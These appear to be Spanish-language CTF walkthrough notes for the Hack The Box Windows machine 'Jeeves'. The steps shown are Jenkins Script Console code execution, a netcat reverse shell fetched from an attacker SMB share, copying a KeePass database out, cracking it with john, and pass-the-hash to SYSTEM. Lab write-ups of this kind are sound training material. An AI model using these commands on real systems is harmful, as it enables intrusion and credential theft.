## Summary

Tags: #Windows #Wfuzz  #Jenkins #Groovy 

- IP -> 10.10.10.63
- Ports -> TCP (80,135,445,50000), UDP (idk)
- OS ->  Windows
- Services & Applications
    - 80 ->  Microsoft IIS httpd 10.0
    - 5000 -> Http Jetty


## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon 

```bash 
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80
❯ whatweb ❮http://IP❯ -v               # Nos dara una breve descripcion de las cabeceras 
```

```bash 
❯ curl -s -X GET http://❮IP❯ -I        # Miramos las cabeceras de respuesta de la pagina web 

	# I = i mayuscula
	# s = silence
```

```bash 
❯ crackmapexec smb 10.10.10.63         # Listar los recursos del SMBv1:TRUE

❯ smbclient -L ❮IP❯ -N                # Lista recursos compartidos a nivel de red haciendo uso de un null sesion (sin credencial alguna) 

❯ smbmap -H ❮IP❯ -u 'null'             # Herramienta elternativa para ver si nos reporta algo mas haciendo uso de un null sesion (sin credencial alguna)
```

Webpage -> < IP> and < IP:50000>

```bash 
❯ wfuzz -c -t 200 --hc=404 -t 200 -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.63/FUZZ

❯ wfuzz -c -t 200 --hc=404 -t 200 -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.63:50000/FUZZ
```

Descubrimos una nueva ruta. 
Ahora toca investigar Jenkins:
	Que es?
	Para que sirve?


El error en la web de Jenkins es que te salga la opción: **Manage Jenkins**
	- Ir a 'Script Console'
	- Puedes crear un script en Groovy (Groovy execute shell command), lo buscamos en Google y lo colocamos en 'Script Console'
```bash 
	❯ println "whoami".execute().text                    # Nos muestre el resultado de 'whoami'
```

```bash 
❯ locate nc.exe                       # Para buscar el Netcat en nuestra maquina de atacante 
	❯ updatedb
```

## User

```bash 
# Puedes crear un script en Groovy (Groovy execute shell command)

❯ println "\\\\10.10.14.17\\smbFolder\\nc.exe -e cmd 10.10.14.17 443".execute().text  

# Vamos a crear un recurso compartido smb con nuestra maquina para compartir el nc.exe y despues hacer que cuando lo ejecute nos regrese una consola interactiva por el puerto 443

```

```bash 
# Nos creamos un recurso de red compartido, sincronizado con la ruta actual en donde se encuentra el archivo a compartir
❯ impacket-smbserver smbFolder $(pwd) -smb2support        

```

```bash 
❯ rlwrap nc -nlvp 443            # Nos ponemos en escucha por el puerto 443 
```

## Root

#### 1ra parte para convertirse en root:
En **C:\\Users\\kohsuke\\Documents** Encontramos un archivo con extencion **.kdbx** 

**copy CEH.kdbx \\\\10.10.14.17\\smbFolder\\CEH.kdbx** Copiamos un archivo de la maquina victima a nuestra maquina de atacante
		- CEH.kdbx -> Nombre dek archivo que nos queremos copiar de la maquina victima
		- 10.10.14.17 -> Nuestra direccion IP
		- smbFolder -> Nombre de la carpeta del recurso compartido 

- Comando -> **file < FILE>** Nos muestra que tipo de archivo es por los magic numbers, y asi saber que es un keepass

- Comando -> **keepassxc CEH.kdbx** Nos permite abrir el archivo keepass teniendo la passwd, de lo contrario hacemos lo siguiente
- Comando -> **keepass2john CEH.kdbx > hash** Si no sabemos la passwd, esto no sayuda a extraer un hash para poder hacer fuerza bruta
- Comando -> **john --wordlist=/usr/share/wordlists/rockyou.txt hash** Aplicamos un ataque de fuerza bruta a un archivo hash

Obtenemos otro hash pero de la herramienta Keepass, por lo que podriamos hacer un 'Pass the hash'
- Comando -> **crackmapexec smb < IP TARGET> -u <‘Administrator’> -H <‘HASH’>** Con este comando verificamos que el usuario y su hash son validos y si es asi nos pondra un [+] Pwn3d!.
- Comando -> **psexec.py WORKGROUP/Administrator@< IP> -hashes <'HASH'>** Podremos ganar acceso al sistema y nos lanzara una cmd ya que estariamos haciendo un Pass de Hash 

Y seriamos nt authority\\System

ADS Alternate Data Strings 
	Comando -> **dir /r /s** Para listar informacion oculta
	Comando -> **more < hm.txt:root.txt** Miramos el contenido de un archivo oculto 


#### 2da parte para convertirse en root
1:29:00 Video para la segunda parte